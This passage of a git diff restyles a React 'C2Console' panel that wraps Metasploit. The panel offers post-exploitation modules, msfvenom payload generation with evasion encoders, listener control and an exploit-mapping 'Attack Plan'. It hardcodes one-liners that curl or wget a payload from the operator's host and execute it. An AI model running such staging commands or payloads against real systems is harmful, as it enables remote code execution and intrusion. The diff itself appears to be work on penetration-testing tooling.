+                          <span style={{ color: 'var(--fg-2)' }}>{activeSession.sysinfo.arch}</span>
                         </div>
                       )}
                       {activeSession.sysinfo.username && (
-                        <div className="flex gap-1.5">
-                          <span className="text-slate-600 w-16 flex-shrink-0">user</span>
-                          <span className="text-green-300 truncate" title={activeSession.sysinfo.username}>{activeSession.sysinfo.username}</span>
+                        <div style={{ display: 'flex', gap: 6 }}>
+                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>user</span>
+                          <span style={{ color: 'var(--ok)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={activeSession.sysinfo.username}>{activeSession.sysinfo.username}</span>
                         </div>
                       )}
                       {activeSession.sysinfo.domain && (
-                        <div className="flex gap-1.5">
-                          <span className="text-slate-600 w-16 flex-shrink-0">domain</span>
-                          <span className="text-purple-300 truncate">{activeSession.sysinfo.domain}</span>
+                        <div style={{ display: 'flex', gap: 6 }}>
+                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>domain</span>
+                          <span style={{ color: '#a78bfa', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{activeSession.sysinfo.domain}</span>
                         </div>
                       )}
                     </div>
                   </div>
                 )}
                 {/* Module buttons */}
-                <div className="glass rounded-xl overflow-hidden flex flex-col" style={{ maxHeight: '240px' }}>
-                  <div className="px-3 py-2 border-b border-cyan-900/20 flex-shrink-0">
-                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Post Modules</span>
+                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden', display: 'flex', flexDirection: 'column', maxHeight: 240 }}>
+                  <div style={{ padding: '8px 12px', borderBottom: rule, flexShrink: 0 }}>
+                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Post Modules</span>
                   </div>
-                  <div className="overflow-y-auto p-2 space-y-1">
+                  <div style={{ overflowY: 'auto', padding: 8, display: 'flex', flexDirection: 'column', gap: 4 }}>
                     {postModules.map(mod => {
                       const isRunning = postHistory.some(e => e.label === mod.label && e.running)
                       return (
@@ -1260,12 +1386,12 @@ export default function C2Console() {
                           onClick={() => handleRunPostModule(mod)}
                           disabled={isRunning}
                           title={mod.description}
-                          className="w-full text-left px-3 py-2 rounded-lg text-xs text-slate-300 hover:bg-cyan-950/20 hover:text-cyan-300 border border-transparent hover:border-cyan-900/30 transition-all flex items-center gap-2 group disabled:opacity-50"
+                          style={{ width: '100%', textAlign: 'left', padding: '8px 12px', borderRadius: 4, fontSize: 11, color: 'var(--fg-2)', background: 'none', border: ruleStrong, cursor: isRunning ? 'not-allowed' : 'pointer', display: 'flex', alignItems: 'center', gap: 8, opacity: isRunning ? 0.5 : 1, fontFamily: 'var(--font-sans)' }}
                         >
                           {isRunning
-                            ? <RefreshCw size={11} className="text-cyan-500 animate-spin flex-shrink-0" />
-                            : <Zap size={11} className="text-slate-600 group-hover:text-cyan-500 flex-shrink-0" />}
-                          <span className="truncate">{mod.label}</span>
+                            ? <Icon name="refresh" size={11} style={{ color: 'var(--accent)', flexShrink: 0 }} className="animate-spin" />
+                            : <Icon name="bolt" size={11} style={{ color: 'var(--fg-4)', flexShrink: 0 }} />}
+                          <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{mod.label}</span>
                         </button>
                       )
                     })}
@@ -1274,64 +1400,64 @@ export default function C2Console() {
 
                 {/* Run history */}
                 {postHistory.length > 0 && (
-                  <div className="glass rounded-xl overflow-hidden flex flex-col flex-1 min-h-0">
-                    <div className="px-3 py-2 border-b border-cyan-900/20 flex-shrink-0 flex items-center justify-between">
-                      <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Results</span>
-                      <button onClick={() => setPostHistory([])} className="text-slate-600 hover:text-red-400 transition-colors" title="Clear history">
-                        <X size={11} />
+                  <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden', display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}>
+                    <div style={{ padding: '8px 12px', borderBottom: rule, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                      <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Results</span>
+                      <button onClick={() => setPostHistory([])} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }} title="Clear history">
+                        <Icon name="x" size={11} />
                       </button>
                     </div>
-                    <div className="overflow-y-auto flex-1 divide-y divide-cyan-900/10">
+                    <div style={{ overflowY: 'auto', flex: 1 }}>
                       {postHistory.map(entry => (
-                        <div key={entry.id} className="text-xs">
+                        <div key={entry.id} style={{ fontSize: 11, borderBottom: rule }}>
                           <button
                             onClick={() => setExpandedHistory(prev => {
                               const n = new Set(prev)
                               n.has(entry.id) ? n.delete(entry.id) : n.add(entry.id)
                               return n
                             })}
-                            className="w-full flex items-center gap-2 px-3 py-2 hover:bg-cyan-950/10 transition-colors text-left"
+                            style={{ width: '100%', display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px', background: 'none', border: 'none', cursor: 'pointer', textAlign: 'left' }}
                           >
                             {entry.running
-                              ? <RefreshCw size={10} className="text-cyan-400 animate-spin flex-shrink-0" />
+                              ? <Icon name="refresh" size={10} style={{ color: 'var(--accent)', flexShrink: 0 }} className="animate-spin" />
                               : entry.error
-                                ? <span className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0" />
-                                : <span className="w-2 h-2 rounded-full bg-green-500 flex-shrink-0" />}
-                            <span className="flex-1 truncate text-slate-300">{entry.label}</span>
-                            <span className="text-slate-600 flex-shrink-0">{entry.ts.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>
+                                ? <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--crit)', flexShrink: 0 }} />
+                                : <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--ok)', flexShrink: 0 }} />}
+                            <span style={{ flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', color: 'var(--fg-2)' }}>{entry.label}</span>
+                            <span style={{ color: 'var(--fg-4)', flexShrink: 0 }}>{entry.ts.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>
                           </button>
                           {expandedHistory.has(entry.id) && (
-                            <div className="px-3 pb-2 space-y-2">
+                            <div style={{ padding: '0 12px 8px', display: 'flex', flexDirection: 'column', gap: 8 }}>
                               {(() => {
                                 const leads = entry.output
                                   ? entry.output.split('\n').filter(l => l.startsWith('[+]'))
                                   : []
                                 return leads.length > 0 && !entry.running ? (
-                                  <div className="rounded-lg border border-green-800/40 bg-green-950/20 p-2 space-y-1">
-                                    <div className="text-[10px] font-semibold text-green-400 uppercase tracking-wider mb-1">
+                                  <div style={{ borderRadius: 4, border: '1px solid rgba(84,175,97,0.3)', background: 'rgba(84,175,97,0.06)', padding: 8, display: 'flex', flexDirection: 'column', gap: 4 }}>
+                                    <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--ok)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 4 }}>
                                       {leads.length} Lead{leads.length !== 1 ? 's' : ''}
                                     </div>
                                     {leads.map((l, i) => {
                                       const match = l.match(/exploit\/[\w/]+/)
                                       const module = match ? match[0] : null
-                                      const desc = l.replace(/\[\+\]\s*[\d\.]+\s*-\s*(exploit\/[\w/]+)?\s*:?\s*/, '').trim()
+                                      const desc = l.replace(/\[\+\]\s*[\d.]+\s*-\s*(exploit\/[\w/]+)?\s*:?\s*/, '').trim()
                                       return (
-                                        <div key={i} className="flex items-start gap-1.5">
-                                          <span className="text-green-500 flex-shrink-0 mt-0.5">›</span>
-                                          <div className="min-w-0">
+                                        <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 6 }}>
+                                          <span style={{ color: 'var(--ok)', flexShrink: 0, marginTop: 2 }}>›</span>
+                                          <div style={{ minWidth: 0 }}>
                                             {module && (
-                                              <div className="flex items-center gap-1">
-                                                <span className="text-[10px] font-mono text-green-300 truncate">{module}</span>
+                                              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
+                                                <span style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--ok)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{module}</span>
                                                 <button
                                                   onClick={() => { navigator.clipboard.writeText(module); setCopied(module) }}
-                                                  className="text-slate-600 hover:text-green-400 flex-shrink-0 transition-colors"
+                                                  style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0, flexShrink: 0 }}
                                                   title="Copy module path"
                                                 >
-                                                  {copied === module ? <span className="text-[9px] text-green-400">✓</span> : <Copy size={9} />}
+                                                  {copied === module ? <span style={{ fontSize: 9, color: 'var(--ok)' }}>✓</span> : <Icon name="copy" size={9} />}
                                                 </button>
                                               </div>
                                             )}
-                                            <span className="text-[9px] text-slate-400">{desc}</span>
+                                            <span style={{ fontSize: 9, color: 'var(--fg-3)' }}>{desc}</span>
                                           </div>
                                         </div>
                                       )
@@ -1340,12 +1466,12 @@ export default function C2Console() {
                                 ) : null
                               })()}
                               {entry.running
-                                ? <span className="text-slate-500 italic">Running…</span>
+                                ? <span style={{ color: 'var(--fg-3)', fontStyle: 'italic' }}>Running…</span>
                                 : entry.error
-                                  ? <span className="text-red-400">{entry.error}</span>
+                                  ? <span style={{ color: 'var(--crit)' }}>{entry.error}</span>
                                   : entry.output
-                                    ? <pre className="text-[10px] text-slate-300 whitespace-pre-wrap break-all max-h-48 overflow-y-auto font-mono leading-relaxed">{entry.output}</pre>
-                                    : <span className="text-slate-600 italic">No output</span>}
+                                    ? <pre style={{ fontSize: 10, color: 'var(--fg-2)', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 192, overflowY: 'auto', fontFamily: 'var(--font-mono)', lineHeight: 1.5 }}>{entry.output}</pre>
+                                    : <span style={{ color: 'var(--fg-4)', fontStyle: 'italic' }}>No output</span>}
                             </div>
                           )}
                         </div>
@@ -1360,15 +1486,15 @@ export default function C2Console() {
 
         {/* Payloads tab */}
         {activeTab === 'payloads' && (
-          <div className="flex-1 overflow-y-auto space-y-4">
-            <div className="glass rounded-xl p-5 border border-cyan-900/20">
-              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
-                <Package size={14} className="text-cyan-400" /> Generate Payload (msfvenom)
+          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 20 }}>
+              <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', marginBottom: 16, display: 'flex', alignItems: 'center', gap: 8 }}>
+                <Icon name="layers" size={14} style={{ color: 'var(--accent)' }} /> Generate Payload (msfvenom)
               </h3>
-              <div className="grid grid-cols-2 gap-4">
-                <div className="col-span-2">
-                  <label className="text-xs text-slate-500 mb-1 block">Payload</label>
-                  <select className={inputClass} style={{ background: '#05080d' }} value={selPayload} onChange={e => {
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
+                <div style={{ gridColumn: '1 / -1' }}>
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Payload</label>
+                  <select style={{ ...inputClass, background: 'var(--bg)' }} value={selPayload} onChange={e => {
                     setSelPayload(e.target.value)
                     const p = payloads.find(x => x.value === e.target.value)
                     if (p) setPayloadFmt(p.formats[0])
@@ -1378,28 +1504,28 @@ export default function C2Console() {
                   </select>
                 </div>
                 <div>
-                  <label className="text-xs text-slate-500 mb-1 block">LHOST</label>
-                  <input value={lhost} onChange={e => setLhost(e.target.value)} className={inputClass} placeholder="192.168.1.100" />
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LHOST</label>
+                  <input value={lhost} onChange={e => setLhost(e.target.value)} style={inputClass} placeholder="192.168.1.100" />
                 </div>
                 <div>
-                  <label className="text-xs text-slate-500 mb-1 block">LPORT</label>
-                  <input value={lport} onChange={e => setLport(e.target.value)} className={inputClass} placeholder="4444" />
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LPORT</label>
+                  <input value={lport} onChange={e => setLport(e.target.value)} style={inputClass} placeholder="4444" />
                 </div>
                 <div>
-                  <label className="text-xs text-slate-500 mb-1 block">Format</label>
-                  <select className={inputClass} style={{ background: '#05080d' }} value={payloadFmt} onChange={e => setPayloadFmt(e.target.value)}>
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Format</label>
+                  <select style={{ ...inputClass, background: 'var(--bg)' }} value={payloadFmt} onChange={e => setPayloadFmt(e.target.value)}>
                     {(payloads.find(p => p.value === selPayload)?.formats || ['elf','exe','raw']).map(f => (
                       <option key={f} value={f}>{f}</option>
                     ))}
                   </select>
                 </div>
                 {/* Evasion options */}
-                <div className="col-span-2 border-t border-cyan-900/20 pt-3 mt-1">
-                  <div className="text-xs text-slate-500 mb-2 font-medium">Evasion Options</div>
-                  <div className="grid grid-cols-3 gap-3">
+                <div style={{ gridColumn: '1 / -1', borderTop: rule, paddingTop: 12, marginTop: 4 }}>
+                  <div style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 8, fontWeight: 500 }}>Evasion Options</div>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 12 }}>
                     <div>
-                      <label className="text-xs text-slate-500 mb-1 block">Encoder</label>
-                      <select className={inputClass} style={{ background: '#05080d' }} value={payloadEncoder} onChange={e => setPayloadEncoder(e.target.value)}>
+                      <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Encoder</label>
+                      <select style={{ ...inputClass, background: 'var(--bg)' }} value={payloadEncoder} onChange={e => setPayloadEncoder(e.target.value)}>
                         <option value="none">None</option>
                         <optgroup label="x86">
                           <option value="x86/shikata_ga_nai">shikata_ga_nai (polymorphic)</option>
@@ -1421,7 +1547,7 @@ export default function C2Console() {
                       </select>
                     </div>
                     <div>
-                      <label className="text-xs text-slate-500 mb-1 block">Iterations</label>
+                      <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Iterations</label>
                       <input
                         type="number"
                         min="1"
@@ -1429,40 +1555,45 @@ export default function C2Console() {
                         value={payloadIterations}
                         onChange={e => setPayloadIterations(e.target.value)}
                         disabled={payloadEncoder === 'none'}
-                        className={inputClass + ' disabled:opacity-40'}
+                        style={{ ...inputClass, opacity: payloadEncoder === 'none' ? 0.4 : 1 }}
                         placeholder="1"
                       />
                     </div>
                     <div>
-                      <label className="text-xs text-slate-500 mb-1 block">Bad chars</label>
+                      <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Bad chars</label>
                       <input
                         value={payloadBadChars}
                         onChange={e => setPayloadBadChars(e.target.value)}
-                        className={inputClass}
+                        style={inputClass}
                         placeholder="\x00\x0a"
                       />
                     </div>
                   </div>
                 </div>
-                <div className="col-span-2 flex items-center gap-2 pt-1">
+                <div style={{ gridColumn: '1 / -1', display: 'flex', alignItems: 'center', gap: 8, paddingTop: 4 }}>
                   <input
                     id="auto-listener"
                     type="checkbox"
                     checked={autoStartListener}
                     onChange={e => setAutoStartListener(e.target.checked)}
-                    className="w-3.5 h-3.5 accent-cyan-500 cursor-pointer"
+                    style={{ width: 14, height: 14, cursor: 'pointer', accentColor: 'var(--accent)' }}
                   />
-                  <label htmlFor="auto-listener" className="text-xs text-slate-400 cursor-pointer select-none">
+                  <label htmlFor="auto-listener" style={{ fontSize: 11, color: 'var(--fg-2)', cursor: 'pointer', userSelect: 'none' }}>
                     Auto-start listener after generating
                   </label>
                 </div>
-                <div className="flex items-end">
+                <div style={{ display: 'flex', alignItems: 'flex-end' }}>
                   <button
                     onClick={handleGeneratePayload}
                     disabled={generatingPayload || !selPayload || !lhost}
-                    className="w-full py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-sm text-white font-medium transition-all hover:shadow-glow-cyan flex items-center justify-center gap-2"
+                    style={{
+                      width: '100%', padding: '8px 0', borderRadius: 4, background: 'var(--accent)', border: 'none',
+                      color: '#0d0c0a', fontSize: 13, fontWeight: 600, cursor: (generatingPayload || !selPayload || !lhost) ? 'not-allowed' : 'pointer',
+                      opacity: (generatingPayload || !selPayload || !lhost) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
+                      fontFamily: 'var(--font-sans)',
+                    }}
                   >
-                    {generatingPayload ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
+                    {generatingPayload ? <Icon name="refresh" size={14} className="animate-spin" /> : <Icon name="download" size={14} />}
                     {generatingPayload ? 'Generating...' : 'Download Payload'}
                   </button>
                 </div>
@@ -1470,18 +1601,18 @@ export default function C2Console() {
 
               {/* One-liner staging commands */}
               {selPayload && lhost && lport && (
-                <div className="mt-4 space-y-2">
-                  <div className="text-xs text-slate-500 mb-2">Quick staging commands:</div>
+                <div style={{ marginTop: 16, display: 'flex', flexDirection: 'column', gap: 8 }}>
+                  <div style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4 }}>Quick staging commands:</div>
                   {[
                     { label: 'Python HTTP server', cmd: `python3 -m http.server 8080` },
                     { label: 'curl download', cmd: `curl http://${lhost}:8080/payload.${payloadFmt} -o /tmp/p && chmod +x /tmp/p && /tmp/p` },
                     { label: 'wget download', cmd: `wget http://${lhost}:8080/payload.${payloadFmt} -O /tmp/p && chmod +x /tmp/p && /tmp/p` },
                   ].map(item => (
-                    <div key={item.label} className="flex items-center gap-2 bg-[#05080d] rounded-lg px-3 py-2 border border-cyan-900/20">
-                      <span className="text-[10px] text-slate-600 w-28 flex-shrink-0">{item.label}</span>
-                      <code className="flex-1 text-xs font-mono text-slate-300 truncate">{item.cmd}</code>
-                      <button onClick={() => copyText(item.cmd, item.label)} className="text-slate-600 hover:text-cyan-400 flex-shrink-0">
-                        {copied === item.label ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
+                    <div key={item.label} style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'var(--bg)', borderRadius: 4, padding: '6px 12px', border: rule }}>
+                      <span style={{ fontSize: 10, color: 'var(--fg-4)', width: 112, flexShrink: 0 }}>{item.label}</span>
+                      <code style={{ flex: 1, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{item.cmd}</code>
+                      <button onClick={() => copyText(item.cmd, item.label)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', flexShrink: 0, padding: 0 }}>
+                        {copied === item.label ? <Icon name="check" size={12} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={12} />}
                       </button>
                     </div>
                   ))}
@@ -1493,79 +1624,86 @@ export default function C2Console() {
 
         {/* Listeners tab */}
         {activeTab === 'listeners' && (
-          <div className="flex-1 overflow-y-auto space-y-4">
+          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
             {/* Start listener form */}
-            <div className="glass rounded-xl p-5 border border-cyan-900/20">
-              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
-                <Radio size={14} className="text-cyan-400" /> Start Listener (multi/handler)
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 20 }}>
+              <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', marginBottom: 16, display: 'flex', alignItems: 'center', gap: 8 }}>
+                <Icon name="radio" size={14} style={{ color: 'var(--accent)' }} /> Start Listener (multi/handler)
               </h3>
-              <div className="grid grid-cols-3 gap-3 items-end">
-                <div className="col-span-3">
-                  <label className="text-xs text-slate-500 mb-1 block">Payload</label>
-                  <select className={inputClass} style={{ background: '#05080d' }} value={listenerPayload} onChange={e => setListenerPayload(e.target.value)}>
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 12, alignItems: 'flex-end' }}>
+                <div style={{ gridColumn: '1 / -1' }}>
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Payload</label>
+                  <select style={{ ...inputClass, background: 'var(--bg)' }} value={listenerPayload} onChange={e => setListenerPayload(e.target.value)}>
                     {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                   </select>
                 </div>
                 <div>
-                  <label className="text-xs text-slate-500 mb-1 block">LHOST</label>
-                  <input value={listenerLhost} onChange={e => setListenerLhost(e.target.value)} className={inputClass} placeholder="0.0.0.0" />
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LHOST</label>
+                  <input value={listenerLhost} onChange={e => setListenerLhost(e.target.value)} style={inputClass} placeholder="0.0.0.0" />
                 </div>
                 <div>
-                  <label className="text-xs text-slate-500 mb-1 block">LPORT</label>
-                  <input value={listenerLport} onChange={e => setListenerLport(e.target.value)} className={inputClass} placeholder="4444" />
+                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LPORT</label>
+                  <input value={listenerLport} onChange={e => setListenerLport(e.target.value)} style={inputClass} placeholder="4444" />
                 </div>
                 <button
                   onClick={handleStartListener}
                   disabled={startingListener || !msfStatus.connected}
-                  className="py-2 rounded-lg bg-green-600 hover:bg-green-500 disabled:opacity-40 text-sm text-white font-medium transition-all flex items-center justify-center gap-2"
+                  style={{
+                    padding: '8px 0', borderRadius: 4, background: 'var(--ok)', border: 'none',
+                    color: '#0d0c0a', fontSize: 13, fontWeight: 600,
+                    cursor: (startingListener || !msfStatus.connected) ? 'not-allowed' : 'pointer',
+                    opacity: (startingListener || !msfStatus.connected) ? 0.4 : 1,
+                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
+                    fontFamily: 'var(--font-sans)',
+                  }}
                 >
-                  {startingListener ? <RefreshCw size={14} className="animate-spin" /> : <Play size={14} />}
+                  {startingListener ? <Icon name="refresh" size={14} className="animate-spin" /> : <Icon name="play" size={14} />}
                   Start
                 </button>
               </div>
             </div>
 
             {/* Active listeners */}
-            <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
-              <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
-                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
-                  Active Jobs & Listeners {listeners.length > 0 && <span className="text-cyan-400 ml-1">({listeners.length})</span>}
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
+              <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
+                  Active Jobs & Listeners {listeners.length > 0 && <span style={{ color: 'var(--accent)', marginLeft: 4 }}>({listeners.length})</span>}
                 </span>
-                <div className="flex items-center gap-3">
+                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                   {msfStatus.connected && (
                     <button
                       onClick={async () => {
-                        await fetch('/api/v1/c2/jobs/all', { method: 'DELETE' })
+                        await fetch(`${getApiBase()}/c2/jobs/all`, { method: 'DELETE' })
                         loadListeners()
                       }}
-                      className="text-[11px] text-red-500 hover:text-red-300 transition-colors flex items-center gap-1"
+                      style={{ fontSize: 11, color: 'var(--crit)', background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 4, fontFamily: 'var(--font-sans)' }}
                       title="Kill all MSF jobs"
                     >
-                      <X size={11} /> Kill All
+                      <Icon name="x" size={11} /> Kill All
                     </button>
                   )}
-                  <button onClick={loadListeners} className="text-slate-600 hover:text-cyan-400 transition-colors">
-                    <RefreshCw size={13} />
+                  <button onClick={loadListeners} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}>
+                    <Icon name="refresh" size={13} />
                   </button>
                 </div>
               </div>
               {listeners.length === 0 ? (
-                <div className="text-center text-slate-600 py-8 text-xs">No active listeners</div>
+                <div style={{ textAlign: 'center', color: 'var(--fg-4)', padding: '32px 0', fontSize: 11 }}>No active listeners</div>
               ) : listeners.map(l => (
-                <div key={l.job_id} className="flex items-center gap-4 px-4 py-3 border-b border-cyan-900/10 hover:bg-cyan-950/10">
-                  <span className="relative flex h-2 w-2">
-                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
-                    <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
+                <div key={l.job_id} style={{ display: 'flex', alignItems: 'center', gap: 16, padding: '10px 16px', borderBottom: rule }}>
+                  <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
+                    <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--ok)', opacity: 0.75 }} />
+                    <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--ok)' }} />
                   </span>
-                  <div className="flex-1">
-                    <div className="text-xs text-slate-200">{l.name}</div>
-                    <div className="text-[10px] text-slate-500 font-mono">
+                  <div style={{ flex: 1 }}>
+                    <div style={{ fontSize: 11, color: 'var(--fg)' }}>{l.name}</div>
+                    <div style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)' }}>
                       {l.datastore?.PAYLOAD} · {l.datastore?.LHOST}:{l.datastore?.LPORT}
                     </div>
                   </div>
-                  <span className="text-[10px] text-slate-600">Job #{l.job_id}</span>
-                  <button onClick={() => handleStopListener(l.job_id)} className="text-slate-600 hover:text-red-400 transition-colors">
-                    <X size={14} />
+                  <span style={{ fontSize: 10, color: 'var(--fg-4)' }}>Job #{l.job_id}</span>
+                  <button onClick={() => handleStopListener(l.job_id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}>
+                    <Icon name="x" size={14} />
                   </button>
                 </div>
               ))}
@@ -1578,103 +1716,111 @@ export default function C2Console() {
 
         {/* Attack Plan tab */}
         {activeTab === 'attack' && (
-          <div className="flex-1 flex flex-col min-h-0 gap-3 overflow-y-auto">
+          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0, gap: 12, overflowY: 'auto' }}>
             {/* Header */}
-            <div className="glass rounded-xl p-4 border border-cyan-900/20 flex items-center justify-between gap-4 flex-shrink-0">
+            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16, display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 16, flexShrink: 0 }}>
               <div>
-                <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
-                  <Crosshair size={14} className="text-red-400" /> Attack Plan
+                <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', display: 'flex', alignItems: 'center', gap: 8 }}>
+                  <Icon name="target" size={14} style={{ color: 'var(--crit)' }} /> Attack Plan
                 </h3>
-                <p className="text-xs text-slate-500 mt-0.5">
+                <p style={{ fontSize: 11, color: 'var(--fg-3)', marginTop: 2 }}>
                   Maps scan findings to Metasploit modules using CVE lookups and service fingerprinting.
                 </p>
               </div>
-              <div className="flex items-center gap-3 flex-shrink-0">
+              <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexShrink: 0 }}>
                 {attackPlan && (
-                  <span className="text-xs text-slate-500">
+                  <span style={{ fontSize: 11, color: 'var(--fg-3)' }}>
                     {attackPlan.matched_count} match{attackPlan.matched_count !== 1 ? 'es' : ''} from {attackPlan.finding_count} findings
                   </span>
                 )}
                 <button
                   onClick={handleGenerateAttackPlan}
-                  disabled={generatingAttack || !selectedProject}
-                  className="flex items-center gap-2 px-4 py-2 rounded-lg bg-red-700/80 hover:bg-red-600 disabled:opacity-40 text-sm text-white font-medium transition-all"
-                  style={{ boxShadow: '0 0 10px rgba(239,68,68,0.2)' }}
+                  disabled={generatingAttack || !projectId}
+                  style={{
+                    display: 'flex', alignItems: 'center', gap: 8, padding: '7px 16px', borderRadius: 4,
+                    background: 'rgba(232,64,64,0.15)', border: '1px solid rgba(232,64,64,0.3)',
+                    color: 'var(--crit)', fontSize: 13, fontWeight: 500,
+                    cursor: (generatingAttack || !projectId) ? 'not-allowed' : 'pointer',
+                    opacity: (generatingAttack || !projectId) ? 0.4 : 1,
+                    fontFamily: 'var(--font-sans)',
+                  }}
                 >
                   {generatingAttack
-                    ? <><RefreshCw size={13} className="animate-spin" /> Scanning...</>
-                    : <><Crosshair size={13} /> {attackPlan ? 'Refresh' : 'Analyze'}</>
+                    ? <><Icon name="refresh" size={13} className="animate-spin" /> Scanning...</>
+                    : <><Icon name="target" size={13} /> {attackPlan ? 'Refresh' : 'Analyze'}</>
                   }
                 </button>
               </div>
             </div>
 
             {attackPlanError && (
-              <p className="text-xs text-red-400 bg-red-950/30 border border-red-500/20 rounded-lg px-3 py-2 flex-shrink-0">{attackPlanError}</p>
+              <p style={{ fontSize: 11, color: 'var(--crit)', background: 'rgba(232,64,64,0.08)', border: '1px solid rgba(232,64,64,0.3)', borderRadius: 4, padding: '8px 12px', flexShrink: 0 }}>{attackPlanError}</p>
             )}
 
             {attackPlan && attackPlan.recommendations.length === 0 && (
-              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-12 text-slate-600">
